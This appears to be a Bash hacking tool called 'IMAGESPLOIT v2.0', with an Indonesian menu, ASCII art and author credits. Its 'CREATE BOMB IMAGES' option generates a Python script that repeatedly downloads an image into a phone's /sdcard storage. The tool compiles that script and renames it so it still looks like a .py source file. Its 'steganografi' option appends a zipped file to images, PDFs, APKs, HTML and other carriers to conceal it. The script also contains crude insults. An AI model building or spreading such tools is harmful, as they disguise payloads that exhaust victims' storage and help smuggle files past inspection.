#!/bin/bash

# Kolor maklo
g="\033[32;1m"
y="\033[33;1m"
ig="\033[34;1m"
r="\033[35;1m"
p="\033[37;1m"
c="\033[36;1m"
w="\033[39;1m"
r2='\033[31m'
i='$i'

echo -e $w"           _"$r2"___                      "$w", "
echo -e $w"          /-"$r2"--.'.__             ____"$w"// "
echo -e $r2"               '--.\           /.---' "
echo -e "          _______  \\         // "
echo -e "        /.------.\  \|      .'/  ______ "
echo -e $r2"       //  ___  \ \ ||"$w"/|\   "$r2"//  _/_----."$w"\__ "
echo -e $w"      |/"$r2"  /.-.\  \ \:|< >|// _/.'..\   "$w"'--' "
echo -e "         //   \'. | \'.|.'/ /_/ /  \.\ "
echo -e $w"        //     \ \_\/  ' ~\-'.-'    \.\ "
echo -e "       //       '-._| :H: |'-.__     \.\ "
echo -e $w"      //           "$r2"(/'==='\)"$w"'-._.\    |.| "
echo -e $w"      ||                        \.\    "$r2"\| "
echo -e $w"      ||                         \.\    "$r2"' "
echo -e $r2"      |/"$w"                          \.\ "
echo -e "                                   |.| "
echo -e "                                   |.| "
echo -e $r"    Author By"$c" : "$y"@SyhrulArv_"$r2"         \/ "
echo -e $r"    Github   "$c" : "$y"https://github.com/Syhrularv"
echo -e $r"    Facebook "$c" : "$y"facebook.com/sarul.arif.5"
echo ""
echo -e $y"    <"$g"==== "$ig"\e[4mIMAGESPLOIT\e[0m "$w"v.2.0"$g" ===="$y">"
echo ""
echo -e $c"["$w"1"$c"]"$ig" CREATE BOMB IMAGES"
echo -e $c"["$w"2"$c"]"$ig" STEGANOGRAFI"
echo -e $c"["$w"3"$c"]"$ig" About me"
echo -e $c"["$w"4"$c"]"$ig" Exit"
echo ""
echo -e $r"Pilih nomernya gan.."
echo -e -n $r2"@B3LUXz >> "$w
read pilih;

bomjpg(){
echo -e -n $y"["$r2"?"$y"]"$c" Masukkan link images "$r2"> "$w
read link;
echo -e -n $y"["$r2"?"$y"]"$c" Masukkan nama images "$r2"> "$w
read nama;
echo -e -n $y"["$r2"?"$y"]"$c" Masukkan jumlah images "$r2"> "$w
read jumlah;
echo -e -n $y"["$r2"?"$y"]"$c" Masukkan nama output file "$r2"> "$w
read otput;

cd output
touch $otput.py

echo -e "import os,sys\n\nos.chdir('/sdcard')\n\nfor i in range (1, $jumlah+1):\n   os.system('wget $link -O $nama'+ str(i) +'.jpg')" > $otput.py
python2 -OO -m py_compile $otput.py
rm $otput.py
mv $otput.pyo $otput.py
echo -e $y"["$g"*"$y"]"$w" Please wait.."
sleep 2
echo -e $y"["$g"√"$y"]"$w" Done tq :*"
}

pdf(){
echo -e -n $g"["$r"?"$g"]"$ig" Nama folder"$c" > "$w
read dir;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file (.pdf)"$c" > "$w
read pdf;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file yg mau disisipkan"$c" > "$w
read sisip;
echo -e $g"["$y"*"$g"]"$r2" Please wait.."
sleep 1
cd /sdcard/$dir
zip test $sisip
cat $pdf test.zip >hasil.pdf
rm test.zip
echo -e $g"["$y"√"$g"]"$r2" Done tq :*"
}

txt(){
echo -e -n $g"["$r"?"$g"]"$ig" Nama folder "$c"> "$w
read dir;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file (.txt)"$c" > "$w
read txt;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file yg mau disisipkan"$c" > "$w
read sisip;
echo -e $g"["$y"*"$g"]"$r2" Please wait.."
sleep 1
cd /sdcard/$dir
zip test $sisip
cat $txt test.zip >hasil.txt
rm test.zip
echo -e $g"["$y"√"$g"]"$r2" Done tq :*"
}

video(){
echo -e -n $g"["$r"?"$g"]"$ig" Nama folder "$c"> "$w
read dir;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file (.mp4)"$c" > "$w
read mp4;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file yg mau disisipkan"$c" > "$w
read sisip;
echo -e $g"["$y"*"$g"]"$r2" Please wait.."
sleep 1
cd /sdcard/$dir
zip test $sisip
cat $mp4 test.zip >hasil.mp4
rm test.zip
echo -e $g"["$y"√"$g"]"$ig" Done tq :*"
}

html(){
echo -e -n $g"["$r"?"$g"]"$ig" Nama folder "$c"> "$w
read dir;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file (.html)"$c" > "$w
read html;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file yg mau disisipkan"$c" > "$w
read sisip;
echo -e $g"["$y"*"$g"]"$r2" Please wait.."
sleep 1
cd /sdcard/$dir
zip test $sisip
cat $html test.zip >hasil.html
rm test.zip
echo -e $g"["$y"√"$g"]"$r2" Done tq :*"
}

apk(){
echo -e -n $g"["$r"?"$g"]"$ig" Nama folder"$c" > "$w
read dir;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file (.apk)"$c" > "$w
read apk;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file yg mau disisipkan"$c" > "$w
read sisip;
echo -e $g"["$y"*"$g"]"$r2" Please wait.."
sleep 1
cd /sdcard/$dir
zip test $sisip
cat $apk test.zip >hasil.apk
rm test.zip
echo -e $g"["$y"√"$g"]"$r2" Done tq :*"
}

mp3(){
echo -e -n $g"["$r"?"$g"]"$ig" Nama folder"$c" > "$w
read dir;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file (.mp3)"$c" > "$w
read mp3;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file yg mau disisipkan"$c" > "$w
read sisip;
echo -e $g"["$y"*"$g"]"$r2" Please wait.."
sleep 1
cd /sdcard/$dir
zip test $sisip
cat $mp3 test.zip >hasil.mp3
rm test.zip
echo -e $g"["$y"*"$g"]"$r2" Done tq :*"
}

doc(){
echo -e -n $g"["$r"?"$g"]"$ig" Nama folder"$c" > "$w
read dir;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file (.doc)"$c" > "$w
read doc;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file yg mau disisipkan"$c" > "$w
read sisip;
echo -e $g"["$y"*"$g"]"$r2" Please wait.."
sleep 1
cd /sdcard/$dir
zip test $sisip
cat $doc test.zip >hasil.doc
rm test.zip
echo -e $g"["$y"√"$g"]"$r2" Done tq :*"
}

jpg(){
echo -e -n $g"["$r"?"$g"]"$ig" Nama folder"$c" > "$w
read dir;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file (.jpg)"$c" > "$w
read jpg;
echo -e -n $g"["$r"?"$g"]"$ig" Nama file yg mau disisipkan"$c" > "$w
read sisip;
echo -e $g"["$y"*"$g"]"$r2" Please wait.."
sleep 1
cd /sdcard/$dir
zip test $sisip
cat $jpg test.zip >hasil.jpg
rm test.zip
echo -e $g"["$y"√"$g"]"$r2" Done tq :*"
}

steganografi(){
echo -e $y"["$r2"!"$y"]"$ig" FILE HARUS SATU FOLDER TARUH DI INTERNAL!"
echo -e $y"["$r2"!"$y"]"$ig" NAMA FILE/FOLDER HARUS TIDAK ADA SPASI"
echo "<==========================================================>" | lolcat
echo "                    STEGANOGRAFI v.2                "
echo ""
echo -e $ig"       ["$w"1"$ig"]"$c" File ke JPG"$ig"           ["$w"5"$ig"]"$c" File ke MP4"
echo -e $ig"       ["$w"2"$ig"]"$c" File ke TXT"$ig"           ["$w"6"$ig"]"$c" File ke MP3"
echo -e $ig"       ["$w"3"$ig"]"$c" File ke PDF"$ig"           ["$w"7"$ig"]"$c" File ke HTML"
echo -e $ig"       ["$w"4"$ig"]"$c" File ke APK"$ig"           ["$w"8"$ig"]"$c" File ke DOC"
echo ""
echo -e $ig"                      ["$w"h"$ig"]"$c" Bantuan"
echo -e -n $y"Pilih nomer"$r2" > "$w
read numb;

case $numb in
	1) jpg ;;
	2) txt ;;
	3) pdf ;;
	4) apk ;;
	5) video ;;
	6) mp3 ;;
	7) html ;;
	8) doc ;;
	h) cat bantuan.txt ;;
	H) cat bantuan.txt ;;
	*) echo -e $y"["$r2"?"$y"]"$r2" Pilihan salah" ;;
esac
}

case $pilih in
        1) bomjpg ;;
        2) steganografi ;;
        3) echo "Di buat oleh ig: @Syhrularv_ fb: Syhrül" | lolcat -a -d 500 ;;
        4) exit ;;
        *) echo "Pilih yg bener goblok!" ;;
esac

# Akhirnya selesai bangsat hehe :)
# SALAMHACKER
#
#
#
# Version 2
#
#
